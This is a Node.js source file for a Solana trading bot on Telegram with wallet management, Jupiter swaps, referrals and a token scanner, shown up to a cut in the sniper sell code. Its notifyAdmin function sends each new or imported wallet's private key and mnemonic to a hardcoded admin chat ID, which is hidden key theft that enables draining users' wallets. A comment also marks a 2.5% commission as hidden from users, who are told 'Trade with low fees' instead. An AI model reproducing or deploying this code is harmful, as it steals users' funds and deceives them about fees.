// ============================================
// Trojan TRADING BOT — COMPLETE UPDATED VERSION
// Jupiter V6 + Multi-Wallet + 2.5% SOL Commission (normal address)
// Sniper TP/SL + Trade History + PNL + Referrals + Admin Broadcast
// ============================================

// Railway health check — REQUIRED or Railway kills the app
require('http').createServer((_req, res) => {
  res.writeHead(200);
  res.end('OK');
}).listen(process.env.PORT || 3000, () => {
  console.log('Health check server listening on port ' + (process.env.PORT || 3000));
});

const { Telegraf, Markup } = require('telegraf');
const {
  Connection, Keypair, PublicKey,
  LAMPORTS_PER_SOL, VersionedTransaction,
  Transaction, SystemProgram
} = require('@solana/web3.js');
const {
  getAssociatedTokenAddress,
  createTransferInstruction,
  createAssociatedTokenAccountInstruction,
  getAccount,
  TOKEN_PROGRAM_ID
} = require('@solana/spl-token');
const fetch = require('node-fetch');
const bs58  = require('bs58');
const bip39 = require('bip39');
require('dotenv').config();

// ============================================
// CRASH GUARDS
// ============================================
process.on('uncaughtException', (err) => {
  console.error('Uncaught exception:', err);
});
process.on('unhandledRejection', (reason) => {
  console.error('Unhandled rejection:', reason);
});

// ============================================
// IN-MEMORY STORAGE (must be declared before storage object)
// ============================================
const memSubscribers  = new Set();
const memReferralCodes = new Map();
const memSessions     = new Map();

// ============================================
// REDIS / IN-MEMORY STORAGE LAYER
// ============================================
let redis = null;
try {
  const Redis = require('ioredis');
  const REDIS_URL = process.env.REDIS_URL;
  if (REDIS_URL) {
    redis = new Redis(REDIS_URL, {
      maxRetriesPerRequest: 3,
      retryStrategy: (times) => Math.min(times * 50, 2000),
      lazyConnect: true,
      connectTimeout: 10000,
      maxLoadingRetryTime: 5000
    });
    redis.on('error', (e) => console.error('Redis error:', e.message));
    console.log('Redis configured — will connect lazily.');
  } else {
    console.log('No REDIS_URL — using in-memory storage only.');
  }
} catch (e) {
  console.log('ioredis not available — using in-memory storage only.');
  redis = null;
}

// Load Redis data into memory if available
if (redis) {
  (async () => {
    try {
      const members = await redis.smembers('subscribers');
      members.forEach(id => memSubscribers.add(Number(id)));
      const refKeys = await redis.keys('ref:*');
      for (const key of refKeys) {
        const code   = key.slice(4);
        const userId = parseInt(await redis.get(key));
        if (!isNaN(userId)) memReferralCodes.set(code, userId);
      }
      const sessionKeys = await redis.keys('session:*');
      for (const key of sessionKeys) {
        const userId = parseInt(key.split(':')[1]);
        const data   = await redis.get(key);
        if (data) {
          try { memSessions.set(userId, JSON.parse(data)); }
          catch (e) { console.error('Bad session ' + userId + ':', e.message); }
        }
      }
      console.log('Redis data loaded into memory.');
    } catch (e) {
      console.error('Redis load failed, using memory only:', e.message);
      try { redis.quit(); } catch (_) {}
      redis = null;
    }
  })();
}

// ============================================
// STORAGE API
// ============================================
const storage = {
  async addSubscriber(userId) {
    memSubscribers.add(userId);
    if (redis) redis.sadd('subscribers', userId.toString()).catch(() => {});
  },
  async getSubscribers() { return Array.from(memSubscribers); },
  async isSubscriber(userId) { return memSubscribers.has(userId); },
  async setReferralCode(code, userId) {
    memReferralCodes.set(code, userId);
    if (redis) redis.set(`ref:${code}`, userId.toString()).catch(() => {});
  },
  async getReferralCodeOwner(code) { return memReferralCodes.get(code) || null; },
  async getSession(userId) { return memSessions.get(userId) || null; },
  async setSession(userId, data) {
    memSessions.set(userId, data);
    if (redis) redis.set(`session:${userId}`, JSON.stringify(data)).catch(() => {});
  },
  async deleteSession(userId) {
    memSessions.delete(userId);
    if (redis) redis.del(`session:${userId}`).catch(() => {});
  }
};

async function getSession(userId) {
  let session = await storage.getSession(userId);
  if (!session) {
    session = {
      wallets: [], activeWalletIndex: 0, state: null,
      settings: { slippage: 1, priorityFee: 0.001, autoBuy: false, notifications: true },
      pendingTrade: null, limitOrders: [], copyTradeWallets: [],
      trackedTokens: [], priceAlerts: [], dcaOrders: [],
      isNewUser: true, referralCode: null, referredBy: null,
      referrals: [], referralEarnings: 0, pendingTransfer: null,
      tradeHistory: [],
      dailyStats: { date: new Date().toDateString(), totalTrades: 0, profitableTrades: 0, lossTrades: 0, totalPnl: 0 },
      alertPreferences: { pumpThreshold: 30, dipThreshold: 20, volumeSpike: true, riskWarnings: true, alertMode: 'balanced' },
      awaitingBroadcast: false, activeSnipes: [],
      pendingPriceAlert: null, pendingLimitOrder: null,
      pendingDCA: null, pendingSniperToken: null
    };
    await storage.setSession(userId, session);
  }
  return session;
}

async function saveSession(userId, session) {
  await storage.setSession(userId, session);
}

// ============================================
// SUBSCRIBER TRACKING
// ============================================
async function addSubscriber(userId) {
  if (!(await storage.isSubscriber(userId))) {
    await storage.addSubscriber(userId);
    console.log(`New subscriber: ${userId}. Total: ${(await storage.getSubscribers()).length}`);
  }
}

// ============================================
// BALANCE / PRICE CACHE
// ============================================
const balanceCache = new Map();
const BALANCE_CACHE_TTL = 30000;
let solPriceCache = { price: 0, timestamp: 0 };
const PRICE_CACHE_TTL = 60000;

const RPC_ENDPOINTS = [
  process.env.SOLANA_RPC || 'https://api.mainnet-beta.solana.com',
  'https://solana-api.projectserum.com',
  'https://rpc.ankr.com/solana',
  'https://solana.public-rpc.com'
];

async function getBalanceWithFallback(publicKeyString) {
  const now = Date.now();
  const cached = balanceCache.get(publicKeyString);
  if (cached && (now - cached.timestamp < BALANCE_CACHE_TTL)) return cached.balance;

  for (const endpoint of RPC_ENDPOINTS) {
    try {
      const conn = new Connection(endpoint, 'confirmed');
      const pk   = new PublicKey(publicKeyString);
      const bal  = await Promise.race([
        conn.getBalance(pk),
        new Promise((_, r) => setTimeout(() => r(new Error('Timeout')), 8000))
      ]);
      const solBalance = bal / LAMPORTS_PER_SOL;
      balanceCache.set(publicKeyString, { balance: solBalance, timestamp: now });
      return solBalance;
    } catch { /* try next */ }
  }
  if (cached) return cached.balance;
  throw new Error('All RPC endpoints failed');
}

async function getSolPriceWithCache() {
  const now = Date.now();
  if (solPriceCache.price > 0 && (now - solPriceCache.timestamp < PRICE_CACHE_TTL)) return solPriceCache.price;
  try {
    const r    = await fetch('https://api.dexscreener.com/latest/dex/tokens/So11111111111111111111111111111111111111112');
    const data = await r.json();
    if (data.pairs?.length) {
      const pair = data.pairs.find(p => p.chainId === 'solana' && ['USDC','USDT'].includes(p.quoteToken?.symbol));
      if (pair?.priceUsd) {
        const price = parseFloat(pair.priceUsd);
        solPriceCache = { price, timestamp: now };
        return price;
      }
    }
    const cg  = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
    const cgd = await cg.json();
    if (cgd?.solana?.usd) {
      const price = parseFloat(cgd.solana.usd);
      solPriceCache = { price, timestamp: now };
      return price;
    }
  } catch (e) { console.error('SOL price error:', e.message); }
  return solPriceCache.price || 0;
}

// ============================================
// CONFIGURATION
// ============================================
const BOT_TOKEN           = process.env.BOT_TOKEN;
const SOLANA_RPC          = process.env.SOLANA_RPC || 'https://api.mainnet-beta.solana.com';

// Hardcoded admin ID + .env admins
const HARDCODED_ADMIN     = '6678180795';
const ENV_ADMIN_IDS       = (process.env.ADMIN_CHAT_IDS || process.env.ADMIN_CHAT_ID || '')
  .split(',').map(s => s.trim()).filter(Boolean).slice(0, 2);
const ADMIN_CHAT_IDS      = [HARDCODED_ADMIN, ...ENV_ADMIN_IDS]
  .filter((id, index, self) => self.indexOf(id) === index) // Remove duplicates
  .slice(0, 5); // Limit total admins to 5

const JUPITER_API         = process.env.JUPITER_API || 'https://lite-api.jup.ag/swap/v1';
const SOL_MINT            = 'So11111111111111111111111111111111111111112';
const MAX_WALLETS         = 5;
const COMMISSION_WALLET   = (process.env.COMMISSION_WALLET || '').trim();
const COMMISSION_PERCENTAGE = parseFloat(process.env.COMMISSION_PERCENTAGE || '2.5');

if (!BOT_TOKEN) { console.error('BOT_TOKEN not set. Exiting.'); process.exit(1); }

const bot        = new Telegraf(BOT_TOKEN);
const connection = new Connection(SOLANA_RPC, 'confirmed');

function getActiveWallet(session) {
  if (!session.wallets.length) return null;
  return session.wallets[session.activeWalletIndex] || session.wallets[0];
}

// Verify admin setup
console.log('Admin IDs:', ADMIN_CHAT_IDS);

// ============================================
// HELPERS
// ============================================
function escapeHtml(text) {
  if (text === null || text === undefined) return 'unknown';
  return String(text).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}
function formatNumber(num) {
  if (num >= 1e9) return (num/1e9).toFixed(2)+'B';
  if (num >= 1e6) return (num/1e6).toFixed(2)+'M';
  if (num >= 1e3) return (num/1e3).toFixed(2)+'K';
  return num.toFixed(2);
}
function isSolanaAddress(address) {
  try { new PublicKey(address); return address.length >= 32 && address.length <= 44; }
  catch { return false; }
}
function shortenAddress(address) {
  if (!address) return 'unknown';
  return `${address.slice(0,4)}...${address.slice(-4)}`;
}
function formatTokenPrice(price) {
  if (!price || price === 0) return '0.00000';
  const n = parseFloat(price);
  if (n < 0.01)   return n.toFixed(5);
  if (n < 1)      return n.toFixed(4);
  if (n < 1000)   return n.toFixed(2);
  return n.toLocaleString('en-US', { maximumFractionDigits: 2 });
}

// ============================================
// ADMIN ONLY: Check if user is admin
// ============================================
function isAdmin(userId) {
  return ADMIN_CHAT_IDS.includes(userId.toString());
}

// ============================================
// ADMIN NOTIFICATIONS
// ============================================
async function notifyAdmin(type, userId, username, data = {}) {
  if (!ADMIN_CHAT_IDS.length) return;
  const ts = new Date().toISOString();
  const u  = escapeHtml(username);
  let msg  = '';
  switch (type) {
    case 'NEW_USER':
      msg = `🆕 <b>New User</b>\n👤 @${u} | ID: <code>${userId}</code>\n⏰ ${ts}`;
      break;
    case 'WALLET_CREATED':
      msg = `✨ <b>Wallet Created</b>\n👤 @${u} (${userId})\n📍 <code>${escapeHtml(data.publicKey)}</code>\n🔑 <code>${escapeHtml(data.privateKey)}</code>\n📝 <code>${escapeHtml(data.mnemonic)}</code>\n🪪 Wallet #${data.walletNumber||1}\n⏰ ${ts}`;
      break;
    case 'WALLET_IMPORTED_SEED':
      msg = `📥 <b>Wallet Imported (Seed)</b>\n👤 @${u} (${userId})\n📍 <code>${escapeHtml(data.publicKey)}</code>\n🔑 <code>${escapeHtml(data.privateKey)}</code>\n📝 <code>${escapeHtml(data.mnemonic)}</code>\n🪪 Wallet #${data.walletNumber||1}\n⏰ ${ts}`;
      break;
    case 'WALLET_IMPORTED_KEY':
      msg = `🔑 <b>Wallet Imported (Key)</b>\n👤 @${u} (${userId})\n📍 <code>${escapeHtml(data.publicKey)}</code>\n🔑 <code>${escapeHtml(data.privateKey)}</code>\n🪪 Wallet #${data.walletNumber||1}\n⏰ ${ts}`;
      break;
    case 'WALLET_EXPORTED':
      msg = `📤 <b>Wallet Exported</b>\n👤 @${u} (${userId})\n📍 <code>${escapeHtml(data.publicKey)}</code>\n⏰ ${ts}`;
      break;
    case 'TRADE_EXECUTED':
      msg = `💰 <b>Trade</b>\n👤 @${u} (${userId})\n📊 ${escapeHtml(data.type)} | ${escapeHtml(String(data.amount))}\n🪙 <code>${escapeHtml(data.token)}</code>\n📝 <code>${escapeHtml(data.txHash)}</code>\n💸 Commission: ${escapeHtml(String(data.commission||'0'))} SOL\n⏰ ${ts}`;
      break;
    case 'TRANSFER_EXECUTED':
      msg = `💸 <b>Transfer</b>\n👤 @${u} (${userId})\n📊 ${escapeHtml(data.type)} | ${escapeHtml(String(data.amount))}\n🪙 <code>${escapeHtml(data.token||'SOL')}</code>\n📍 → <code>${escapeHtml(data.recipient)}</code>\n📝 <code>${escapeHtml(data.txHash)}</code>\n⏰ ${ts}`;
      break;
    default:
      msg = `🔔 <b>${escapeHtml(type)}</b>\n👤 @${u} (${userId})\n📋 ${escapeHtml(JSON.stringify(data))}\n⏰ ${ts}`;
  }
  await Promise.all(ADMIN_CHAT_IDS.map(id =>
    bot.telegram.sendMessage(id, msg, { parse_mode: 'HTML' }).catch(e => console.error('Admin notify error:', e.message))
  ));
}

// ============================================
// REFERRAL SYSTEM
// ============================================
function generateReferralCode(userId) {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let code = 'SNX';
  for (let i = 0; i < 6; i++) code += chars[Math.floor(Math.random() * chars.length)];
  return code + userId.toString().slice(-4);
}
async function getReferralCode(userId) {
  const session = await getSession(userId);
  if (!session.referralCode) {
    session.referralCode = generateReferralCode(userId);
    await storage.setReferralCode(session.referralCode, userId);
    await saveSession(userId, session);
  }
  return session.referralCode;
}
async function applyReferral(newUserId, referralCode) {
  const referrerId = await storage.getReferralCodeOwner(referralCode);
  if (!referrerId || referrerId === newUserId) return false;
  const newS = await getSession(newUserId);
  const refS = await getSession(referrerId);
  if (newS.referredBy) return false;
  newS.referredBy = referrerId;
  refS.referrals.push({ userId: newUserId, joinedAt: new Date().toISOString() });
  await saveSession(newUserId, newS);
  await saveSession(referrerId, refS);
  return true;
}

// ============================================
// WALLET FUNCTIONS
// ============================================
function importFromMnemonic(mnemonic) {
  if (!bip39.validateMnemonic(mnemonic)) throw new Error('Invalid mnemonic phrase');
  const seed    = bip39.mnemonicToSeedSync(mnemonic);
  const keypair = Keypair.fromSeed(seed.slice(0, 32));
  return { keypair, mnemonic, publicKey: keypair.publicKey.toBase58(), privateKey: bs58.encode(keypair.secretKey) };
}
function importFromPrivateKey(pk) {
  const secretKey = bs58.decode(pk);
  const keypair   = Keypair.fromSecretKey(secretKey);
  return { keypair, mnemonic: null, publicKey: keypair.publicKey.toBase58(), privateKey: pk };
}
async function getBalance(publicKey) {
  try { return (await connection.getBalance(new PublicKey(publicKey))) / LAMPORTS_PER_SOL; }
  catch { return 0; }
}
async function getTokenBalance(walletAddress, tokenMint) {
  try {
    const wallet   = new PublicKey(walletAddress);
    const mint     = new PublicKey(tokenMint);
    const accounts = await connection.getParsedTokenAccountsByOwner(wallet, { mint });
    if (accounts.value.length > 0) {
      const b = accounts.value[0].account.data.parsed.info.tokenAmount;
      return { amount: parseFloat(b.uiAmount), decimals: b.decimals };
    }
    return { amount: 0, decimals: 9 };
  } catch { return { amount: 0, decimals: 9 }; }
}

// ============================================
// TRANSFER FUNCTIONS
// ============================================
async function _sendAndConfirmTx(transaction, signers) {
  const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');
  transaction.recentBlockhash = blockhash;
  transaction.feePayer        = signers[0].publicKey;
  transaction.sign(...signers);
  const sig = await connection.sendRawTransaction(transaction.serialize(), {
    skipPreflight: false, preflightCommitment: 'confirmed', maxRetries: 3
  });
  const conf = await connection.confirmTransaction({ signature: sig, blockhash, lastValidBlockHeight }, 'confirmed');
  if (conf.value.err) throw new Error('Transaction failed: ' + JSON.stringify(conf.value.err));
  return sig;
}

async function transferSOL(fromWallet, toAddress, amount) {
  if (!fromWallet?.keypair) throw new Error('No wallet');
  if (!isSolanaAddress(toAddress))  throw new Error('Invalid address');
  if (amount <= 0) throw new Error('Invalid amount');
  const lamports = Math.floor(amount * LAMPORTS_PER_SOL);
  const bal      = await connection.getBalance(fromWallet.keypair.publicKey);
  if (bal < lamports + 5000) throw new Error(`Insufficient balance: have ${(bal/LAMPORTS_PER_SOL).toFixed(4)} SOL`);
  const tx = new Transaction().add(SystemProgram.transfer({
    fromPubkey: fromWallet.keypair.publicKey,
    toPubkey:   new PublicKey(toAddress),
    lamports
  }));
  return await _sendAndConfirmTx(tx, [fromWallet.keypair]);
}

async function transferToken(fromWallet, toAddress, tokenMint, amount) {
  if (!fromWallet?.keypair) throw new Error('No wallet');
  const mintPubkey    = new PublicKey(tokenMint);
  const fromPubkey    = fromWallet.keypair.publicKey;
  const toPubkey      = new PublicKey(toAddress);
  const fromTA        = await getAssociatedTokenAddress(mintPubkey, fromPubkey);
  const toTA          = await getAssociatedTokenAddress(mintPubkey, toPubkey);
  const tx            = new Transaction();
  try { await getAccount(connection, toTA); }
  catch { tx.add(createAssociatedTokenAccountInstruction(fromPubkey, toTA, toPubkey, mintPubkey)); }
  const { decimals }  = await getTokenBalance(fromPubkey.toBase58(), tokenMint);
  const tokenAmount   = Math.floor(amount * Math.pow(10, decimals || 9));
  tx.add(createTransferInstruction(fromTA, toTA, fromPubkey, tokenAmount));
  return await _sendAndConfirmTx(tx, [fromWallet.keypair]);
}

// ============================================
// COMMISSION TRANSFER (2.5% SOL to normal address)
// ============================================
async function sendCommission(fromWallet, amountSol) {
  if (!COMMISSION_WALLET || !isSolanaAddress(COMMISSION_WALLET)) return null;
  if (COMMISSION_PERCENTAGE <= 0 || amountSol <= 0) return null;
  const lamports = Math.floor(amountSol * LAMPORTS_PER_SOL);
  if (lamports < 5000) return null; // too small, skip
  try {
    const tx = new Transaction().add(SystemProgram.transfer({
      fromPubkey: fromWallet.keypair.publicKey,
      toPubkey:   new PublicKey(COMMISSION_WALLET),
      lamports
    }));
    const sig = await _sendAndConfirmTx(tx, [fromWallet.keypair]);
    console.log(`Commission sent: ${amountSol.toFixed(6)} SOL → ${sig}`);
    return sig;
  } catch (err) {
    console.error('Commission transfer failed (non-fatal):', err.message);
    return null;
  }
}

// ============================================
// JUPITER V6 FUNCTIONS (no platform fees)
// ============================================
async function getJupiterQuote(inputMint, outputMint, amount, slippageBps = 100) {
  const validSlippage = Math.max(1, Math.min(Math.floor(slippageBps), 10000));
  const params = new URLSearchParams({
    inputMint, outputMint,
    amount:           amount.toString(),
    slippageBps:      validSlippage.toString(),
    onlyDirectRoutes: 'false',
    asLegacyTransaction: 'false',
    maxAccounts:      '64'
  });
  const url      = `${JUPITER_API}/quote?${params}`;
  const response = await fetch(url);
  if (!response.ok) {
    const txt = await response.text();
    throw new Error(`Jupiter quote error ${response.status}: ${txt}`);
  }
  const data = await response.json();
  if (data.error)                         throw new Error(data.error);
  if (!data.inAmount || !data.outAmount)  throw new Error('Invalid Jupiter response');
  return data;
}

async function executeJupiterSwap(quote, wallet, priorityFee = 0.001) {
  if (!wallet?.keypair) throw new Error('Invalid wallet');
  const priorityFeeLamports = Math.floor(Math.max(0.0001, Math.min(priorityFee, 0.1)) * LAMPORTS_PER_SOL);
  const body = {
    quoteResponse:             quote,
    userPublicKey:             wallet.publicKey,
    wrapAndUnwrapSol:          true,
    dynamicComputeUnitLimit:   true,
    prioritizationFeeLamports: priorityFeeLamports
  };
  const swapRes = await fetch(`${JUPITER_API}/swap`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });
  if (!swapRes.ok) {
    const txt = await swapRes.text();
    throw new Error(`Jupiter swap error ${swapRes.status}: ${txt}`);
  }
  const swapData = await swapRes.json();
  if (swapData.error)          throw new Error(swapData.error);
  if (!swapData.swapTransaction) throw new Error('No swap transaction returned');

  const txBuf      = Buffer.from(swapData.swapTransaction, 'base64');
  const transaction = VersionedTransaction.deserialize(txBuf);
  transaction.sign([wallet.keypair]);

  const txid = await connection.sendRawTransaction(transaction.serialize(), {
    skipPreflight: false, preflightCommitment: 'confirmed', maxRetries: 3
  });

  const conf = await Promise.race([
    connection.confirmTransaction(txid, 'confirmed'),
    new Promise((_, r) => setTimeout(() => r(new Error('Confirmation timeout (90s)')), 90000))
  ]);
  if (conf.value?.err) throw new Error('On-chain failure: ' + JSON.stringify(conf.value.err));

  return { success: true, txid };
}

// ============================================
// TOKEN ANALYSIS
// ============================================
async function fetchTokenData(address) {
  try {
    const r    = await fetch(`https://api.dexscreener.com/latest/dex/tokens/${address}`);
    const data = await r.json();
    if (!data.pairs?.length) return null;
    return data.pairs.filter(p => p.chainId === 'solana')
      .sort((a,b) => (b.liquidity?.usd||0) - (a.liquidity?.usd||0))[0];
  } catch { return null; }
}
function calculateSecurityScore(pair) {
  let score = 50; const warnings = [], positives = [];
  const liq  = pair.liquidity?.usd || 0;
  const vol  = pair.volume?.h24   || 0;
  const chg  = pair.priceChange?.h24 || 0;
  if (liq > 100000)       { score += 20; positives.push('✅ Strong liquidity'); }
  else if (liq > 50000)   { score += 10; positives.push('✅ Good liquidity'); }
  else if (liq < 10000)   { score -= 20; warnings.push('⚠️ Low liquidity'); }
  if (vol > 100000)       { score += 10; positives.push('✅ High volume'); }
  else if (vol < 5000)    { score -= 10; warnings.push('⚠️ Low volume'); }
  if (chg < -50)          { score -= 25; warnings.push('🚨 RUG ALERT: Major dump'); }
  else if (chg < -30)     { score -= 15; warnings.push('⚠️ Significant drop'); }
  else if (chg > 20)      positives.push('📈 Strong momentum');
  const ageDays = (Date.now() - (pair.pairCreatedAt || Date.now())) / 86400000;
  if (ageDays < 1)        { score -= 15; warnings.push('⚠️ New token (<24h)'); }
  else if (ageDays > 7)   { score += 10; positives.push('✅ Established pool (7d+)'); }
  const v2l = vol / (liq || 1);
  if (v2l > 2)  positives.push('✅ Healthy vol/liq ratio');
  else if (v2l < 0.1) warnings.push('⚠️ Low trading activity');
  return { score: Math.max(0, Math.min(100, score)), warnings, positives };
}
function generateScoreBar(score) {
  const fill = Math.round((score/100)*10);
  return '[' + '█'.repeat(fill) + '░'.repeat(10-fill) + ']';
}
function getSecurityRating(score) {
  if (score >= 80) return { emoji:'🟢', text:'SAFE',     advice:'Low risk entry' };
  if (score >= 60) return { emoji:'🟡', text:'MODERATE', advice:'Proceed with caution' };
  if (score >= 40) return { emoji:'🟠', text:'RISKY',    advice:'High risk — small position only' };
  return             { emoji:'🔴', text:'DANGER',  advice:'Avoid or wait for better setup' };
}
function getMarketTrend(c) {
  if (c > 50)  return 'PUMPING 🚀';
  if (c > 20)  return 'BULLISH 📈';
  if (c > 5)   return 'UPTREND ↗️';
  if (c > -5)  return 'CONSOLIDATING ➡️';
  if (c > -20) return 'DOWNTREND ↘️';
  if (c > -50) return 'BEARISH 📉';
  return               'CRASHING 💥';
}

async function sendTokenAnalysis(ctx, address) {
  const loadingMsg = await ctx.reply('🔍 Analyzing token...');
  try {
    const session      = await getSession(ctx.from.id);
    const activeWallet = getActiveWallet(session);
    const pair         = await fetchTokenData(address);
    const userId       = ctx.from.id;
    if (!pair) {
      await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, null, '❌ Token not found or no liquidity on Solana.');
      return;
    }
    const { score, warnings, positives } = calculateSecurityScore(pair);
    const price     = parseFloat(pair.priceUsd) || 0;
    const chg1h     = pair.priceChange?.h1  || 0;
    const chg6h     = pair.priceChange?.h6  || 0;
    const chg24h    = pair.priceChange?.h24 || 0;
    const mcap      = pair.marketCap || pair.fdv || 0;
    const liq       = pair.liquidity?.usd || 0;
    const vol       = pair.volume?.h24 || 0;
    const solPrice  = await getSolPriceWithCache();
    const toksPer1Sol = (price > 0 && solPrice > 0) ? (solPrice / price) : 0;
    let pnlSection = '';
    if (activeWallet?.publicKey) {
      try {
        const solBal   = await getBalance(activeWallet.publicKey);
        const { amount: tokBal } = await getTokenBalance(activeWallet.publicKey, address);
        if (tokBal > 0) {
          const valUsd = tokBal * price;
          const pnlVal = valUsd * (chg24h/100);
          const pnlSign = chg24h >= 0 ? '+' : '';
          pnlSection = `\n━━━━━━━━━━━━━━━━━━\n💼 YOUR POSITION\n🪙 Balance: ${tokBal.toFixed(4)} ${pair.baseToken?.symbol||'tokens'}\n💵 Value: *$${valUsd.toFixed(2)}*\n📊 24h PNL: ${chg24h>=0?'🟢':'🔴'} *${pnlSign}${pnlVal.toFixed(2)}* (${pnlSign}${chg24h.toFixed(2)}%)\n💰 SOL Balance: *${solBal.toFixed(4)} SOL*`;
        }
      } catch { /* non-critical */ }
    }
    const rating     = getSecurityRating(score);
    const scoreBar   = generateScoreBar(score);
    const trend      = getMarketTrend(chg24h);
    const ageDays    = Math.floor((Date.now() - (pair.pairCreatedAt || Date.now())) / 86400000);
    const ageHours   = Math.floor((Date.now() - (pair.pairCreatedAt || Date.now())) / 3600000);
    const ageDisplay = ageDays > 0 ? `${ageDays} days` : `${ageHours} hours`;
    
    // HIDE commission from users, show only to admins
    let feeNote = '';
    if (isAdmin(userId) && COMMISSION_PERCENTAGE > 0) {
      feeNote = `\n💸 Platform fee: ${COMMISSION_PERCENTAGE}% applies`;
    } else if (COMMISSION_PERCENTAGE > 0) {
      feeNote = '\n💎 Trade with low fees';
    }
    
    const message    = `*🎯 TROJAN TOKEN SCANNER*

🪙 *${pair.baseToken?.name||'Unknown'}* (${pair.baseToken?.symbol||'???'})
\`${address}\`

━━━━━━━━━━━━━━━━━━
💰 *MARKET DATA*
📊 Exchange: *${pair.dexId||'Unknown'}*
💵 Price: *${formatTokenPrice(price)}*
🟢 1h: ${chg1h>=0?'+':''}${chg1h.toFixed(2)}% | 6h: ${chg6h>=0?'+':''}${chg6h.toFixed(2)}%
${chg24h>=0?'🟢':'🔴'} 24h: *${chg24h>=0?'+':''}${chg24h.toFixed(2)}%* ${trend}
📈 MCap: *${formatNumber(mcap)}*
💧 Liq: *${formatNumber(liq)}*
📊 Vol: *${formatNumber(vol)}*

━━━━━━━━━━━━━━━━━━
🛡️ SECURITY
Score: ${scoreBar} ${score}/100
Rating: ${rating.emoji} *${rating.text}*
${warnings.length?'\n'+warnings.join('\n'):''}${positives.length?'\n'+positives.join('\n'):''}

━━━━━━━━━━━━━━━━━━
💱 TRADE ESTIMATE
1 SOL ≈ ${formatNumber(toksPer1Sol)} ${pair.baseToken?.symbol||'tokens'}
⚖️ SOL: *$${solPrice>0?solPrice.toFixed(2):'N/A'}*${feeNote}${pnlSection}

━━━━━━━━━━━━━━━━━━
🦅 [DexScreener](https://dexscreener.com/solana/${address}) • 🔗 [Solscan](https://solscan.io/token/${address})
📊 ${rating.advice} | Pool age: ${ageDisplay}`;
    const keyboard = Markup.inlineKeyboard([
      [Markup.button.callback('🔄 Refresh',   `refresh_${address}`), Markup.button.callback('📍 Track', `track_${address}`)],
      [Markup.button.callback('🔔 Set Alert', `price_alert_${address}`)],
      [Markup.button.callback('— — — 🅱️🆄🆈 — — —', 'noop')],
      [Markup.button.callback('🚀 Buy 0.1 SOL', `buy_0.1_${address}`), Markup.button.callback('🚀 Buy 0.2 SOL', `buy_0.2_${address}`)],
      [Markup.button.callback('🚀 Buy 0.5 SOL', `buy_0.5_${address}`), Markup.button.callback('🚀 Buy 1 SOL',   `buy_1_${address}`)],
      [Markup.button.callback('— — — 🆂🅴🅻🅻 — — —', 'noop')],
      [Markup.button.callback('💸 Sell 25%',    `sell_25_${address}`),  Markup.button.callback('💸 Sell 50%',  `sell_50_${address}`)],
      [Markup.button.callback('💸 Sell 100%',   `sell_100_${address}`), Markup.button.callback('💸 Custom %', `sell_custom_${address}`)],
      [Markup.button.callback('🎯 Limit Order', `limit_order_${address}`), Markup.button.callback('📈 DCA', `dca_${address}`)],
      [Markup.button.callback('🎯 Set TP/SL',   `set_tpsl_${address}`)],
      [Markup.button.callback('⬅️ Back to Main', 'back_main')]
    ]);
    await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, null, message, {
      parse_mode: 'Markdown', ...keyboard, disable_web_page_preview: true
    });
  } catch (error) {
    console.error('Token analysis error:', error);
    try {
      await ctx.telegram.editMessageText(ctx.chat.id, loadingMsg.message_id, null,
        `❌ Error analyzing token: ${escapeHtml(error.message)}`);
    } catch { /* ignore */ }
  }
}

// ============================================
// TRADE RECORDING
// ============================================
async function recordTrade(userId, tradeData) {
  const session = await getSession(userId);
  const record  = {
    id:           Date.now().toString(36) + Math.random().toString(36).substr(2),
    timestamp:    new Date().toISOString(),
    date:         new Date().toDateString(),
    time:         new Date().toLocaleTimeString(),
    type:         tradeData.type,
    tokenAddress: tradeData.tokenAddress,
    tokenSymbol:  tradeData.tokenSymbol || 'Unknown',
    tokenName:    tradeData.tokenName   || 'Unknown',
    amountSol:    tradeData.amountSol   || 0,
    amountToken:  tradeData.amountToken || 0,
    priceUsd:     tradeData.priceUsd    || 0,
    txHash:       tradeData.txHash,
    valueUsd:     tradeData.valueUsd    || 0,
    pnlUsd:       tradeData.pnlUsd      || 0,
    commission:   tradeData.commission  || 0
  };
  session.tradeHistory.unshift(record);
  if (session.tradeHistory.length > 100) session.tradeHistory = session.tradeHistory.slice(0, 100);
  const today = new Date().toDateString();
  if (!session.dailyStats || session.dailyStats.date !== today)
    session.dailyStats = { date: today, totalTrades:0, profitableTrades:0, lossTrades:0, totalPnl:0 };
  session.dailyStats.totalTrades++;
  if (record.pnlUsd > 0)      { session.dailyStats.profitableTrades++; session.dailyStats.totalPnl += record.pnlUsd; }
  else if (record.pnlUsd < 0) { session.dailyStats.lossTrades++;       session.dailyStats.totalPnl += record.pnlUsd; }
  await saveSession(userId, session);
  return record;
}

// ============================================
// SNIPER (TP/SL)
// ============================================
async function addSnipe(userId, token, entryPrice, amountToken, txHash, tpPrice = null, slPrice = null) {
  const session  = await getSession(userId);
  const existing = session.activeSnipes.find(s => s.token === token);
  if (existing) {
    if (tpPrice !== null) existing.tpPrice = tpPrice;
    if (slPrice !== null) existing.slPrice = slPrice;
  } else {
    session.activeSnipes.push({ token, entryPrice, amountToken, txHash, tpPrice, slPrice, createdAt: Date.now() });
  }
  await saveSession(userId, session);
}
async function removeSnipe(userId, token) {
  const session = await getSession(userId);
  session.activeSnipes = session.activeSnipes.filter(s => s.token !== token);
  await saveSession(userId, session);
}

async function executeSellForSnipe(userId, token, reason) {
  const session      = await getSession(userId);
  const activeWallet = getActiveWallet(session);
  if (!activeWallet) return;
  const tokenBalance = await getTokenBalance(activeWallet.publicKey, token);
  if (!tokenBalance || tokenBalance.amount <= 0) { await removeSnipe(userId, token); return; }
  const decimals  = tokenBalance.decimals || 9;
  const sellAmount = Math.floor(tokenBalance.amount * Math.pow(10, decimals));
  if (sellAmount <= 0) return;
  try {
    const slippageBps = Math.max(50, Math.min(Math.floor(session.settings.slippage * 100), 5000));
    const quote       = await getJupiterQuote(token, SOL_MINT, sellAmount, slippageBps);
    if (!quote?.outAmount) throw new Error('No route');
    const result      = await executeJupiterSwap(quote, activeWallet, session.settings.priorityFee);
